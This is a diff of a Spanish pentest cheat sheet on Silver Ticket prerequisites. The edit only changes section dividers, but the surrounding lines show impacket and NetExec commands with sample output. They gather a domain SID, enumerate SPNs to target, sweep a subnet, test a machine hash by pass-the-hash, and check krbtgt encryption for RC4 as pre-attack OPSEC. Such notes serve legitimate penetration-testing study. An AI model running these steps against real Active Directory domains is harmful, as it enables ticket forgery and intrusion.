@@ -18,7 +18,7 @@ linked:
 
 # Silver Ticket - Prereqs y SPNs
 
-***
+---
 
 ## Domain SID — recolección
 
@@ -36,7 +36,7 @@ impacket-lookupsid corp.local/user:'P@ssw0rd'@dc01.corp.local 0 | grep -i "domai
 # Domain SID: S-1-5-21-1234567890-987654321-111222333
 ```
 
-___
+---
 
 ## SPN discovery — qué servicios atacar
 
@@ -56,7 +56,7 @@ impacket-GetUserSPNs corp.local/user:'P@ssw0rd'@dc01.corp.local
 # HTTP/web01.corp.local   svc_iis     ...
 ```
 
-___
+---
 
 ## FQDN target — resolver host
 
@@ -74,7 +74,7 @@ nxc smb 10.10.10.0/24
 # 10.10.10.5  WEB01    [*] Windows Server 2019 ... (domain:corp.local)
 ```
 
-___
+---
 
 ## Test de hash antes de forjar
 
@@ -91,7 +91,7 @@ impacket-smbclient -hashes :ABC123 corp.local/'WEB01$'@web01.corp.local
 # smb: \> ls   ← si funciona, hash válido
 ```
 
-___
+---
 
 ## Verificar SPN existe en AD
 
@@ -109,7 +109,7 @@ impacket-GetUserSPNs corp.local/user:'P@ssw0rd'@dc01.corp.local | grep -i web01
 # CIFS/web01.corp.local      WEB01$
 ```
 
-___
+---
 
 ## OPSEC pre-ataque
 
@@ -128,4 +128,4 @@ nxc ldap DC -u user -p pass --query '(samAccountName=krbtgt)' 'msDS-SupportedEnc
 # 0x1C = RC4+AES128+AES256 → RC4 OK
 ```
 
-***
+---
